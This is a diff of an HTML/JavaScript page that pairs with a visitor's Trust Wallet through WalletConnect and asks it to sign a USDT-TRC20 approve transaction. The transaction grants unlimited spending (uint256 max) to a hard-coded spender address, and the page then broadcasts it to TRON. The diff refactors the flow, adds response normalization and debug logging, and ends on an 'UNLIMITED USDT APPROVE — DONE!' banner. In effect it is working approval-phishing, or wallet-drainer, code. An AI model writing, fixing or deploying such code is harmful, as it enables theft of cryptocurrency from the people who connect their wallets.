@@ -15,66 +15,25 @@
     }
     h1{color:#26A17B;font-size:1.5rem;margin-bottom:6px}
     .sub{color:#555;font-size:.83rem;margin-bottom:26px;text-align:center;line-height:1.6}
-    .card{
-      background:#111;border:1px solid #1e1e1e;
-      border-radius:14px;padding:24px;
-      width:100%;max-width:500px;
-    }
-    .step{
-      display:flex;gap:12px;align-items:flex-start;
-      padding:12px;border-radius:8px;
-      background:#0d0d0d;border-left:3px solid #222;
-      margin-bottom:10px;transition:border-color .3s;
-    }
+    .card{background:#111;border:1px solid #1e1e1e;border-radius:14px;padding:24px;width:100%;max-width:500px;}
+    .step{display:flex;gap:12px;align-items:flex-start;padding:12px;border-radius:8px;background:#0d0d0d;border-left:3px solid #222;margin-bottom:10px;transition:border-color .3s;}
     .step.active{border-left-color:#f0a500}
     .step.done  {border-left-color:#22c55e}
     .step.error {border-left-color:#ef4444}
     .step-icon{font-size:1.1rem;min-width:22px}
     .step-title{font-weight:600;font-size:.9rem}
     .step-detail{font-size:.72rem;color:#555;margin-top:3px;word-break:break-all}
-    #qr-area{
-      display:none;flex-direction:column;
-      align-items:center;margin-top:18px;gap:10px;
-    }
+    #qr-area{display:none;flex-direction:column;align-items:center;margin-top:18px;gap:10px;}
     #qr-area p{color:#aaa;font-size:.82rem}
     #qr-canvas{background:#fff;padding:8px;border-radius:8px}
     #wc-uri{font-size:.62rem;color:#333;word-break:break-all;text-align:center;max-width:460px}
-    #deeplink-btn{
-      display:none;background:#3375BB;color:#fff;
-      border:none;border-radius:10px;
-      padding:13px;font-size:1rem;cursor:pointer;
-      width:100%;margin-top:14px;font-weight:600;
-    }
-    .result{
-      display:none;margin-top:16px;
-      background:#0d1f0d;border:1px solid #22c55e33;
-      border-radius:8px;padding:14px;
-      font-size:.72rem;color:#86efac;
-      word-break:break-all;white-space:pre-wrap;
-    }
-    .errbox{
-      display:none;margin-top:16px;
-      background:#1f0d0d;border:1px solid #ef444433;
-      border-radius:8px;padding:14px;
-      font-size:.72rem;color:#fca5a5;word-break:break-all;
-    }
-    #retry{
-      display:none;margin-top:12px;
-      background:#ef4444;color:#fff;border:none;
-      border-radius:8px;padding:10px 22px;
-      cursor:pointer;font-size:.88rem;
-    }
-    #loading-overlay{
-      position:fixed;inset:0;background:#0a0a0aee;
-      display:flex;flex-direction:column;
-      align-items:center;justify-content:center;
-      z-index:999;gap:14px;
-    }
-    .spinner{
-      width:40px;height:40px;
-      border:3px solid #222;border-top-color:#26A17B;
-      border-radius:50%;animation:spin .8s linear infinite;
-    }
+    #deeplink-btn{display:none;background:#3375BB;color:#fff;border:none;border-radius:10px;padding:13px;font-size:1rem;cursor:pointer;width:100%;margin-top:14px;font-weight:600;}
+    .result{display:none;margin-top:16px;background:#0d1f0d;border:1px solid #22c55e33;border-radius:8px;padding:14px;font-size:.72rem;color:#86efac;word-break:break-all;white-space:pre-wrap;}
+    .errbox{display:none;margin-top:16px;background:#1f0d0d;border:1px solid #ef444433;border-radius:8px;padding:14px;font-size:.72rem;color:#fca5a5;word-break:break-all;}
+    #retry{display:none;margin-top:12px;background:#ef4444;color:#fff;border:none;border-radius:8px;padding:10px 22px;cursor:pointer;font-size:.88rem;}
+    #debug-box{margin-top:14px;background:#0a0a14;border:1px solid #2222aa44;border-radius:8px;padding:12px;font-size:.68rem;color:#6677ff;word-break:break-all;white-space:pre-wrap;display:none;}
+    #loading-overlay{position:fixed;inset:0;background:#0a0a0aee;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:999;gap:14px;}
+    .spinner{width:40px;height:40px;border:3px solid #222;border-top-color:#26A17B;border-radius:50%;animation:spin .8s linear infinite;}
     @keyframes spin{to{transform:rotate(360deg)}}
     #loading-overlay p{color:#555;font-size:.85rem}
   </style>
@@ -93,30 +52,23 @@
 </p>
 
 <div class="card">
-  <div class="step" id="s1">
-    <span class="step-icon">🔧</span>
-    <div><div class="step-title">Initialize WalletConnect v2</div>
-    <div class="step-detail" id="d1">Starting…</div></div>
+  <div class="step" id="s1"><span class="step-icon">🔧</span>
+    <div><div class="step-title">Initialize WalletConnect v2</div><div class="step-detail" id="d1">Starting…</div></div>
   </div>
-  <div class="step" id="s2">
-    <span class="step-icon">🔗</span>
-    <div><div class="step-title">Generate Pairing URI</div>
-    <div class="step-detail" id="d2">Waiting…</div></div>
+  <div class="step" id="s2"><span class="step-icon">🔗</span>
+    <div><div class="step-title">Generate Pairing URI</div><div class="step-detail" id="d2">Waiting…</div></div>
   </div>
-  <div class="step" id="s3">
-    <span class="step-icon">📱</span>
-    <div><div class="step-title">Wallet Connects</div>
-    <div class="step-detail" id="d3">Waiting…</div></div>
+  <div class="step" id="s3"><span class="step-icon">📱</span>
+    <div><div class="step-title">Wallet Connects</div><div class="step-detail" id="d3">Waiting…</div></div>
   </div>
-  <div class="step" id="s4">
-    <span class="step-icon">🏗️</span>
-    <div><div class="step-title">Build Transaction via TronGrid</div>
-    <div class="step-detail" id="d4">Waiting…</div></div>
+  <div class="step" id="s4"><span class="step-icon">🏗️</span>
+    <div><div class="step-title">Build Transaction via TronGrid</div><div class="step-detail" id="d4">Waiting…</div></div>
   </div>
-  <div class="step" id="s5">
-    <span class="step-icon">📤</span>
-    <div><div class="step-title">Sign &amp; Broadcast</div>
-    <div class="step-detail" id="d5">Waiting…</div></div>
+  <div class="step" id="s5"><span class="step-icon">✍️</span>
+    <div><div class="step-title">Sign in Wallet</div><div class="step-detail" id="d5">Waiting…</div></div>
+  </div>
+  <div class="step" id="s6"><span class="step-icon">📡</span>
+    <div><div class="step-title">Broadcast to TRON</div><div class="step-detail" id="d6">Waiting…</div></div>
   </div>
 
   <div id="qr-area">
@@ -124,115 +76,127 @@
     <canvas id="qr-canvas" width="220" height="220"></canvas>
     <div id="wc-uri"></div>
   </div>
-
   <button id="deeplink-btn">📲 Open in Trust Wallet</button>
 
-  <div class="result" id="result"></div>
-  <div class="errbox" id="errbox"></div>
+  <div class="result"  id="result"></div>
+  <div class="errbox"  id="errbox"></div>
+  <div id="debug-box"></div>
   <button id="retry" onclick="location.reload()">🔄 Retry</button>
 </div>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
-
 <script type="module">
 
-// ══════════════════════════════════════════════════
-//  CONFIG
-// ══════════════════════════════════════════════════
-const PROJECT_ID = "171db6da15a54effc1b4a06f889a3c3f"; // ← only thing to change
+const PROJECT_ID  = "171db6da15a54effc1b4a06f889a3c3f";
+const TRON_CHAIN  = "tron:0x2b6653dc";
+const USDT_TRC20  = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+const SPENDER     = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
 
-// ══════════════════════════════════════════════════
-//  CONSTANTS
-// ══════════════════════════════════════════════════
-const TRON_CHAIN    = "tron:0x2b6653dc";
-const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT TRC20
-const SPENDER       = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV"; // your spender
-const UINT256_MAX   = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-
-// ══════════════════════════════════════════════════
-//  BASE58 → HEX  (TRON address)
-//  TRON addresses decode to 21 bytes: 0x41 + 20 bytes
-// ══════════════════════════════════════════════════
+// ── Base58 → 21-byte hex ("41" + 40 hex chars) ──────────────────────────────
 const B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
-
 function tronToHex(addr) {
   let n = 0n;
   for (const c of addr) n = n * 58n + BigInt(B58.indexOf(c));
-  // n is 25 bytes (50 hex chars): 1 byte prefix(41) + 20 bytes + 4 bytes checksum
-  let h = n.toString(16).padStart(50, "0");
-  return h.slice(0, 42); // 21 bytes hex = "41" + 40 hex chars
+  return n.toString(16).padStart(50,"0").slice(0,42); // 21 bytes, drop checksum
 }
 
-// ══════════════════════════════════════════════════
-//  ABI ENCODE parameter for triggersmartcontract
-//  TRON uses the 20-byte portion of the 41-prefixed hex
-//  padded to 32 bytes (Ethereum ABI style)
-// ══════════════════════════════════════════════════
-function encodeApproveParam(spenderTronHex) {
-  // spenderTronHex = "41" + 40 chars → drop "41", take 40 chars, pad to 64
-  const addrPart = spenderTronHex.slice(2).padStart(64, "0"); // 20 bytes padded
-  const amtPart  = UINT256_MAX;                                // uint256 max
-  return addrPart + amtPart;
+// ── ABI-encode approve(address spender, uint256 amount) ─────────────────────
+// TRON ABI = same as Ethereum: spender is the 20-byte (drop leading "41")
+// padded left to 32 bytes, then uint256 max
+function encodeApproveParam(spenderHex41) {
+  const addr20 = spenderHex41.slice(2).padStart(64, "0"); // 20 bytes → 32 bytes
+  const maxVal = "f".repeat(64);                           // uint256 max
+  return addr20 + maxVal;
 }
 
-// ══════════════════════════════════════════════════
-//  BUILD TX — let TronGrid do the heavy lifting
-//  POST /wallet/triggersmartcontract returns a
-//  fully valid unsigned transaction with correct
-//  raw_data_hex, ref_block_bytes, expiration, etc.
-// ══════════════════════════════════════════════════
-async function buildApproveTx(ownerHex) {
-  // ownerHex = "41xxxxxxxx..." (21 bytes)
-  const spenderHex = tronToHex(SPENDER);
-  const parameter  = encodeApproveParam(spenderHex);
-
-  const payload = {
-    owner_address:     ownerHex,                  // "41..." hex
-    contract_address:  tronToHex(USDT_CONTRACT),  // "41..." hex
+// ── TronGrid: build unsigned tx ──────────────────────────────────────────────
+async function buildTx(ownerHex41) {
+  const body = {
+    owner_address:     ownerHex41,
+    contract_address:  tronToHex(USDT_TRC20),
     function_selector: "approve(address,uint256)",
-    parameter:         parameter,                 // 64+64 hex chars
-    fee_limit:         100_000_000,               // 100 TRX
+    parameter:         encodeApproveParam(tronToHex(SPENDER)),
+    fee_limit:         100_000_000,
     call_value:        0,
-    visible:           false                      // use hex addresses
+    visible:           false
   };
 
-  console.log("triggersmartcontract payload:", payload);
+  debugLog("▶ triggersmartcontract request", body);
 
   const res  = await fetch("https://api.trongrid.io/wallet/triggersmartcontract", {
-    method:  "POST",
-    headers: { "Content-Type": "application/json" },
-    body:    JSON.stringify(payload)
+    method: "POST",
+    headers:{"Content-Type":"application/json"},
+    body: JSON.stringify(body)
   });
   const data = await res.json();
+  debugLog("◀ triggersmartcontract response", data);
 
-  console.log("TronGrid triggersmartcontract response:", data);
-
-  // TronGrid returns: { result: { result: true }, transaction: { ... } }
   if (!data?.result?.result) {
-    throw new Error(
-      "TronGrid rejected tx build: " +
-      (data?.result?.message
-        ? atob(data.result.message)           // message is base64 encoded
-        : JSON.stringify(data))
-    );
+    const msg = data?.result?.message ? atob(data.result.message) : JSON.stringify(data);
+    throw new Error("TronGrid build failed: " + msg);
   }
-
-  return data.transaction; // fully built unsigned tx — ready to sign
+  return data.transaction; // raw unsigned transaction object
 }
 
-// ══════════════════════════════════════════════════
-//  UI HELPERS
-// ══════════════════════════════════════════════════
+// ── Normalize signed tx returned by Trust Wallet ─────────────────────────────
+// Trust Wallet may return:
+//   (A) the full signed tx object directly  { txID, raw_data, signature: [...] }
+//   (B) wrapped:  { transaction: { txID, raw_data, signature: [...] } }
+//   (C) only signature string — we merge it back onto the unsigned tx
+function normalizeSignedTx(walletResponse, unsignedTx) {
+  debugLog("◀ raw wallet response", walletResponse);
+
+  // Case B: wrapped
+  if (walletResponse?.transaction) return walletResponse.transaction;
+
+  // Case A: has signature array already
+  if (walletResponse?.signature && Array.isArray(walletResponse.signature)) {
+    return walletResponse;
+  }
+
+  // Case C: only a hex signature string returned
+  if (typeof walletResponse === "string" && walletResponse.length >= 128) {
+    return { ...unsignedTx, signature: [walletResponse] };
+  }
+
+  // Case D: signature is in result.signature
+  if (walletResponse?.result?.signature) {
+    return { ...unsignedTx, signature: [walletResponse.result.signature] };
+  }
+
+  // Fallback: try using response as-is
+  return walletResponse;
+}
+
+// ── Broadcast ────────────────────────────────────────────────────────────────
+async function broadcast(signedTx) {
+  debugLog("▶ broadcast payload", signedTx);
+
+  // Safety check — must have signature
+  if (!signedTx?.signature?.length) {
+    throw new Error("Signed tx has no signature field — wallet may have rejected.");
+  }
+
+  const res  = await fetch("https://api.trongrid.io/wallet/broadcasttransaction", {
+    method: "POST",
+    headers:{"Content-Type":"application/json"},
+    body: JSON.stringify(signedTx)
+  });
+  const data = await res.json();
+  debugLog("◀ broadcast response", data);
+  return data;
+}
+
+// ── UI helpers ───────────────────────────────────────────────────────────────
 const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+const steps    = ["s1","s2","s3","s4","s5","s6"];
 
 function setStep(id, state, detail) {
   document.getElementById(id).className = `step ${state}`;
-  if (detail !== undefined)
-    document.getElementById(id.replace("s","d")).textContent = detail;
+  if (detail !== undefined) document.getElementById(id.replace("s","d")).textContent = detail;
 }
-
 function showErr(msg) {
-  ["s1","s2","s3","s4","s5"].forEach(id => {
+  steps.forEach(id => {
     if (document.getElementById(id).classList.contains("active"))
       setStep(id, "error", msg);
   });
@@ -241,14 +205,19 @@ function showErr(msg) {
   b.textContent   = "❌ " + msg;
   document.getElementById("retry").style.display = "inline-block";
 }
-
 function showResult(txid) {
   const b = document.getElementById("result");
   b.style.display = "block";
   b.innerHTML =
-    `✅ <strong>Unlimited USDT Approve — SUCCESS!</strong>\n\n` +
-    `TxID: ${txid}\n\n` +
-    `🔗 View: https://tronscan.org/#/transaction/${txid}`;
+    `✅ UNLIMITED USDT APPROVE — DONE!\n\n` +
+    `TxID:\n${txid}\n\n` +
+    `🔗 https://tronscan.org/#/transaction/${txid}`;
+}
+function debugLog(label, obj) {
+  const box = document.getElementById("debug-box");
+  box.style.display = "block";
+  box.textContent  += `\n${label}:\n${JSON.stringify(obj, null, 2)}\n${"─".repeat(40)}\n`;
+  console.log(label, obj);
 }
 
 let qrInst = null;
@@ -256,41 +225,30 @@ function renderQR(uri) {
   if (isMobile) {
     const btn = document.getElementById("deeplink-btn");
     btn.style.display = "block";
-    btn.onclick = () => {
-      window.location.href =
-        `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
-    };
+    btn.onclick = () => { window.location.href = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`; };
   } else {
     document.getElementById("qr-area").style.display = "flex";
     document.getElementById("wc-uri").textContent    = uri;
     if (qrInst) qrInst.clear();
-    qrInst = new QRCode(document.getElementById("qr-canvas"), {
-      text: uri, width: 220, height: 220,
-      colorDark: "#000", colorLight: "#fff",
-      correctLevel: QRCode.CorrectLevel.M
+    qrInst = new QRCode(document.getElementById("qr-canvas"),{
+      text:uri,width:220,height:220,colorDark:"#000",colorLight:"#fff",
+      correctLevel:QRCode.CorrectLevel.M
     });
   }
 }
-
 function hideQR() {
   document.getElementById("qr-area").style.display      = "none";
   document.getElementById("deeplink-btn").style.display = "none";
 }
 
-// ══════════════════════════════════════════════════
-//  MAIN
-// ══════════════════════════════════════════════════
+// ── MAIN ─────────────────────────────────────────────────────────────────────
 async function main() {
   try {
-
-    // Load WalletConnect via esm.sh
-    const { SignClient } = await import(
-      "https://esm.sh/@walletconnect/sign-client@2.17.0"
-    );
+    const { SignClient } = await import("https://esm.sh/@walletconnect/sign-client@2.17.0");
     document.getElementById("loading-overlay").style.display = "none";
 
-    // ── 1. Init
-    setStep("s1", "active", "Initializing…");
+    // 1. Init
+    setStep("s1","active","Initializing…");
     const client = await SignClient.init({
       projectId: PROJECT_ID,
       metadata: {
@@ -300,10 +258,10 @@ async function main() {
         icons:       ["https://cryptologos.cc/logos/tether-usdt-logo.png"]
       }
     });
-    setStep("s1", "done", "SignClient ready ✓");
+    setStep("s1","done","SignClient ready ✓");
 
-    // ── 2. Connect
-    setStep("s2", "active", "Generating pairing URI…");
+    // 2. Connect
+    setStep("s2","active","Generating pairing URI…");
     const { uri, approval } = await client.connect({
       requiredNamespaces: {
         tron: {
@@ -313,12 +271,12 @@ async function main() {
         }
       }
     });
-    if (!uri) throw new Error("Empty URI — check Project ID.");
-    setStep("s2", "done", "URI ready ✓");
+    if (!uri) throw new Error("Empty URI — verify Project ID.");
+    setStep("s2","done","URI ready ✓");
     renderQR(uri);
 
-    // ── 3. Wait for wallet session
-    setStep("s3", "active", isMobile
+    // 3. Await wallet scan + session approval
+    setStep("s3","active", isMobile
       ? "Tap button → approve in Trust Wallet…"
       : "Scan QR with Trust Wallet…"
     );
@@ -326,50 +284,45 @@ async function main() {
     hideQR();
 
     const accounts   = session.namespaces?.tron?.accounts ?? [];
-    const walletAddr = accounts[0]?.split(":")[2]; // e.g. "TWxxxxx"
-    if (!walletAddr) throw new Error("No TRON address returned from session.");
-    setStep("s3", "done", `Connected: ${walletAddr}`);
+    const walletAddr = accounts[0]?.split(":")[2];
+    if (!walletAddr) throw new Error("No TRON address in session.");
+    setStep("s3","done",`Connected: ${walletAddr}`);
 
-    // ── 4. Build transaction via TronGrid (correct raw_data_hex)
-    setStep("s4", "active", "Calling TronGrid to build tx…");
-    const ownerHex = tronToHex(walletAddr);
-    const tx       = await buildApproveTx(ownerHex);
-    setStep("s4", "done", `Tx built ✓ — txID: ${tx.txID}`);
+    // 4. Build unsigned tx via TronGrid
+    setStep("s4","active","Calling TronGrid…");
+    const ownerHex41 = tronToHex(walletAddr);
+    const unsignedTx = await buildTx(ownerHex41);
+    setStep("s4","done",`Built ✓  txID: ${unsignedTx.txID}`);
 
-    // ── 5. Send to wallet for signing — fires immediately
-    setStep("s5", "active", "Waiting for wallet signature…");
-    const signed = await client.request({
+    // 5. Send to wallet — fires immediately after session
+    setStep("s5","active","Waiting for wallet signature…");
+    const walletResponse = await client.request({
       topic:   session.topic,
       chainId: TRON_CHAIN,
       request: {
         method: "tron_signTransaction",
-        params: { transaction: tx }   // TronGrid-built tx, Trust Wallet signs it
+        params: { transaction: unsignedTx }
       }
     });
 
-    console.log("Signed tx:", signed);
+    // ← KEY FIX: normalize whatever Trust Wallet returns
+    const signedTx = normalizeSignedTx(walletResponse, unsignedTx);
+    debugLog("✅ normalized signedTx", signedTx);
+    setStep("s5","done","Signed ✓");
 
-    // ── 6. Broadcast
-    setStep("s5", "active", "Broadcasting to TRON network…");
-    const bcRes  = await fetch("https://api.trongrid.io/wallet/broadcasttransaction", {
-      method:  "POST",
-      headers: { "Content-Type": "application/json" },
-      body:    JSON.stringify(signed)
-    });
-    const bcJson = await bcRes.json();
-    console.log("Broadcast result:", bcJson);
+    // 6. Broadcast
+    setStep("s6","active","Broadcasting…");
+    const bcResult = await broadcast(signedTx);
 
-    if (bcJson.result === true) {
-      setStep("s5", "done", `Broadcast OK ✓`);
-      showResult(bcJson.txid);
+    if (bcResult.result === true) {
+      setStep("s6","done","Broadcast OK ✓");
+      showResult(bcResult.txid);
     } else {
-      const errMsg = bcJson.message
-        ? atob(bcJson.message)
-        : JSON.stringify(bcJson);
-      throw new Error("Broadcast failed: " + errMsg);
+      const errMsg = bcResult.message ? atob(bcResult.message) : JSON.stringify(bcResult);
+      throw new Error("Broadcast rejected: " + errMsg);
     }
 
-  } catch (err) {
+  } catch(err) {
     console.error(err);
     document.getElementById("loading-overlay").style.display = "none";
     showErr(err?.message ?? String(err));
